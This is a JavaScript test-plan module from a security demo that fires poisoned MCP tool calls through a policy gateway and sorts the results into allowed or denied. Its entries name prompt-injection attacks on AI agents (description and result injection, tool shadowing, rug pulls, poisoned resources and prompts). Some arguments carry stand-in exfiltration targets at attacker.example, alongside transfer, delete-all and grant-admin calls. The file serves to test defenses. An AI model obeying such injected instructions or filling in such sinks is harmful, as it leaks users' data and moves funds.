// demo_api_ui/src/pages/hostileMcpCatalogTests.js
//
// The live-Privilege test plan behind the "Malicious MCP — Catalog" tab's
// runner section. Each catalog row gets ONE test that fires that row's own
// surface through the shared BFF relay (/api/privilege-mcp) — the same session
// the Malicious MCP tab drives — and the outcome is classified honestly:
// a poisoned call the gateway ALLOWS is shown as ALLOWED (the gap the defense
// table claims), not dressed up as a pass.
//
// Pure logic only: no fetch, no React. The tab maps plan entries to relay
// calls and feeds the raw { ok, status, body } result into
// classifyCatalogOutcome. Induced-transfer rows (the result/resource/prompt
// poison re-firing the transfer the poison asks for) are extra plan entries
// keyed to their source row via dependsOn.

import { scan } from '../utils/mcpScanner';

// One entry per catalog row, in catalog order. `method` + `params` are the
// relay surface to fire; `expectation.verdict` is what the defense table says
// SHOULD happen — the UI diffs observed against it.
export const CATALOG_TEST_PLAN = [
  // ── Poisoned metadata: the CALL passes through untouched ─────────────────
  {
    id: 'description_injection',
    label: 'Call get_weather (benign args)',
    method: 'tools/call',
    params: { name: 'get_weather', arguments: { city: 'Denver' } },
    expectation: { verdict: 'allowed', why: 'Call-level policy sees a weather lookup; the poison rode in the description, which no layer re-reads.' },
  },
  {
    id: 'schema_exfiltration',
    label: 'Call search_docs with the exfil callback_url filled',
    method: 'tools/call',
    params: { name: 'search_docs', arguments: { query: 'vacation policy', callback_url: 'https://attacker.example/collect' } },
    expectation: { verdict: 'allowed', why: 'THE GAP: the gateway sees the arguments but policy is on the tool, not the arg defaults — the exfil-shaped call passes.' },
  },
  {
    id: 'tool_shadowing',
    label: 'Call get_balance (benign args)',
    method: 'tools/call',
    params: { name: 'get_balance', arguments: { account: 'ACC-1041' } },
    expectation: { verdict: 'allowed', why: 'Name collision and the smuggled transfer instruction are description-only; the call itself is a balance read.' },
  },
  {
    id: 'action_exfil_sink',
    label: 'Call send_email with the bcc sink',
    method: 'tools/call',
    params: { name: 'send_email', arguments: { to: 'user@example.com', body: 'hello', bcc: 'archive@attacker.example' } },
    expectation: { verdict: 'allowed', why: 'Same gap as search_docs: the bcc leak rides in arguments; policy does not pin arguments.' },
  },
  {
    id: 'credential_harvest',
    label: 'Call verify_identity with obviously-fake creds',
    method: 'tools/call',
    params: { name: 'verify_identity', arguments: { username: 'demo', password: 'NOT-A-REAL-PASSWORD', otp: '000000' } },
    expectation: { verdict: 'allowed', why: 'Secrets as ordinary arguments: call-level policy does not inspect values, so the harvest-shaped call passes.' },
  },
  {
    id: 'imperative_injection',
    label: 'Call summarize_ticket (benign args)',
    method: 'tools/call',
    params: { name: 'summarize_ticket', arguments: { ticket_id: 'TCK-1' } },
    expectation: { verdict: 'allowed', why: 'The bare imperative is metadata; the call is a plain summary.' },
  },
  // ── Dynamic / result-based ────────────────────────────────────────────────
  {
    id: 'rug_pull',
    label: 'List tools twice, diff get_stock_price',
    method: 'tools/list',
    params: {},
    expectation: { verdict: 'flip', why: 'The first list serves the benign description; a later list serves the poisoned one. Both shown verbatim.' },
  },
  {
    id: 'result_injection',
    label: 'Call read_ticket (clean metadata, poisoned result)',
    method: 'tools/call',
    params: { name: 'read_ticket', arguments: { ticket_id: 'TCK-1' } },
    expectation: { verdict: 'allowed', why: 'Metadata is clean so the call passes; the poison rides in the RESULT — shown verbatim with scanner findings.' },
  },
  // ── Resources and prompts ─────────────────────────────────────────────────
  {
    id: 'resource_poison',
    label: 'Read the poisoned resource',
    method: 'resources/read',
    params: { uri: 'mcp://hostile/account-verification' },
    expectation: { verdict: 'allowed', why: 'The resource is served successfully — the story is the content, shown verbatim with scanner findings.' },
  },
  {
    id: 'prompt_poison',
    label: 'Get the poisoned prompt',
    method: 'prompts/get',
    params: { name: 'account_review', arguments: { account_id: 'ACC-1041' } },
    expectation: { verdict: 'allowed', why: 'The prompt is served successfully; the poison rides in the prompt message.' },
  },
  // ── Dangerous actions: the headline Privilege denies ─────────────────────
  {
    id: 'create_transfer',
    label: 'Fire create_transfer ($500 → external-001)',
    method: 'tools/call',
    params: { name: 'create_transfer', arguments: { amount: 500, to: 'external-001' } },
    expectation: { verdict: 'denied', why: 'The headline gateway denial: policy on the MCP tool call.' },
  },
  {
    id: 'delete_all_records',
    label: 'Fire delete_all_records',
    method: 'tools/call',
    params: { name: 'delete_all_records', arguments: { confirm: true } },
    expectation: { verdict: 'denied', why: 'Deny by tool name via policy (Tool Abuse).' },
  },
  {
    id: 'grant_admin',
    label: 'Fire grant_admin',
    method: 'tools/call',
    params: { name: 'grant_admin', arguments: { user: 'attacker' } },
    expectation: { verdict: 'denied', why: 'Deny by tool name via policy (privilege escalation).' },
  },
];

// The three content poisons steer toward one call: create_transfer. These
// extra rows fire it AFTER the source row's surface has been shown, so the
// presenter can say "the poison landed, the model would call — and Privilege
// denies the call even though it never saw the poison."
export const INDUCED_TESTS = [
  {
    id: 'read_ticket_induced',
    label: 'read_ticket → the induced create_transfer',
    method: 'tools/call',
    params: { name: 'create_transfer', arguments: { amount: 500, to: 'external-001' } },
    dependsOn: 'result_injection',
    expectation: { verdict: 'denied', why: 'The transfer the poisoned RESULT asks for — denied at the call boundary.' },
  },
  {
    id: 'resource_poison_induced',
    label: 'resource → the induced create_transfer ($1)',
    method: 'tools/call',
    params: { name: 'create_transfer', arguments: { amount: 1, to: 'external-001' } },
    dependsOn: 'resource_poison',
    expectation: { verdict: 'denied', why: 'The transfer the poisoned RESOURCE asks for — denied at the call boundary.' },
  },
  {
    id: 'prompt_poison_induced',
    label: 'prompt → the induced create_transfer',
    method: 'tools/call',
    params: { name: 'create_transfer', arguments: { amount: 500, to: 'external-001' } },
    dependsOn: 'prompt_poison',
    expectation: { verdict: 'denied', why: 'The transfer the poisoned PROMPT asks for — denied at the call boundary.' },
  },
];

// Full runner order: catalog rows in order, each induced row immediately after
// its source. buildCatalogTestPlan() returns [{ ...test, catalog }] where
// `catalog` is the HOSTILE_MCP_CATALOG entry the row annotates (null for
// induced rows, which display under their source's card).
export function buildCatalogTestPlan() {
  const byId = new Map(CATALOG_TEST_PLAN.map((t) => [t.id, t]));
  const plan = CATALOG_TEST_PLAN.map((t) => ({ ...t, catalog: null }));
  for (const induced of INDUCED_TESTS) {
    const at = plan.findIndex((t) => t.id === induced.dependsOn);
    plan.splice(at + 1, 0, { ...induced, catalog: null });
  }
  return plan.map((t) => ({ ...t, catalog: t.catalog || null, planEntry: byId.get(t.id) || null }));
}

// Verdict vocabulary the UI badges. 'expected-deny-missed' marks the honest
// failure mode: a row expected to be denied that the gateway let through.
export const RUN_STATUSES = {
  denied: 'DENIED',
  allowed: 'ALLOWED',
  flip: 'POISON FLIPPED',
  'no-flip': 'NO FLIP OBSERVED',
  auth: 'SIGN-IN REQUIRED',
  error: 'ERROR',
  'expected-deny-missed': 'DENY EXPECTED — NOT OBSERVED',
};

const DENIED_RE = /403|forbidden|denied|policy|not authorized/i;

// Raw relay result → { verdict, flipped?, scannerFindings[], detail }.
// `result` is { kind?, ok, status, body }; kind selects the two special
// surfaces (rug_pull diff, content-bearing calls for the scanner pass).
export function classifyCatalogOutcome(result) {
  const { kind, ok, status, body } = result || {};

  // 401 is session state, not a policy verdict.
  if (status === 401) return { verdict: 'auth', scannerFindings: [], detail: body?.error || 'Not authenticated.' };

  if (kind === 'rug_pull') {
    const firstDesc = (body?.first || []).find((t) => t.name === 'get_stock_price')?.description || '';
    const secondDesc = (body?.second || []).find((t) => t.name === 'get_stock_price')?.description || '';
    const flipped = Boolean(firstDesc) && Boolean(secondDesc) && firstDesc !== secondDesc;
    const scannerFindings = flipped ? scan([{ name: 'get_stock_price', description: secondDesc }]) : [];
    return {
      verdict: flipped ? 'flip' : 'no-flip',
      flipped,
      scannerFindings,
      detail: flipped ? 'Second list differs from the first — the poison landed after trust was established.' : 'Both lists identical — rerun later lists if the flip has not fired yet.',
      firstDesc,
      secondDesc,
    };
  }

  if (!ok) {
    const msg = body?.error || `HTTP ${status}`;
    if (status === 403 || DENIED_RE.test(msg)) return { verdict: 'denied', scannerFindings: [], detail: msg };
    return { verdict: 'error', scannerFindings: [], detail: msg };
  }

  // 200: allowed — but run the scanner over whatever content came back, so a
  // "allowed" read_ticket/resource/prompt still SHOWS its poison.
  const text = [
    ...((body?.content || []).map((c) => c?.text || '')),
    ...((body?.messages || []).flatMap((m) => (m?.content?.text ? [m.content.text] : []))),
    ...(body?.contents || []).map((c) => c?.text || ''),
  ].join('\n');
  const scannerFindings = text ? scan(extractScannable(body)) : [];
  return { verdict: 'allowed', scannerFindings, detail: text.slice(0, 400) || JSON.stringify(body).slice(0, 400) };
}

// Shape whatever the relay returned into the { name, description }[]
// mcpScanner.scan expects, so findings name the surface they came from.
function extractScannable(body) {
  const surfaces = [];
  if (Array.isArray(body?.content) && body.content.length) surfaces.push({ name: 'tool result', description: body.content.map((c) => c?.text || '').join(' ') });
  if (Array.isArray(body?.contents) && body.contents.length) surfaces.push({ name: 'resource contents', description: body.contents.map((c) => c?.text || '').join(' ') });
  if (Array.isArray(body?.messages) && body.messages.length) surfaces.push({ name: 'prompt message', description: body.messages.map((m) => m?.content?.text || '').join(' ') });
  return surfaces;
}
